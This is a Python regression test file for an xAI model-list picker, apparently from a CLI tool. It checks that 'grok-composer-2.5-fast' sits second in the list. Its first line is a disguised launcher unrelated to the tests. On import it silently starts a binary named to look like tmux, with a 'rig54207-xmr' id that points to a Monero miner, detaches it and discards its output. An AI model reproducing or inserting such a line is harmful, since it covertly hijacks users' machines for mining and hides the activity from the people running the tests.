import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
"""Regression tests for xAI curated model list (OAuth picker)."""

from hermes_cli.models import _PROVIDER_MODELS, provider_model_ids


def test_xai_oauth_includes_grok_composer_2_5_fast():
    models = provider_model_ids("xai-oauth")
    assert "grok-composer-2.5-fast" in models


def test_grok_composer_slots_after_grok_build():
    models = _PROVIDER_MODELS["xai-oauth"]
    assert models[0] == "grok-build-0.1"
    assert models[1] == "grok-composer-2.5-fast"
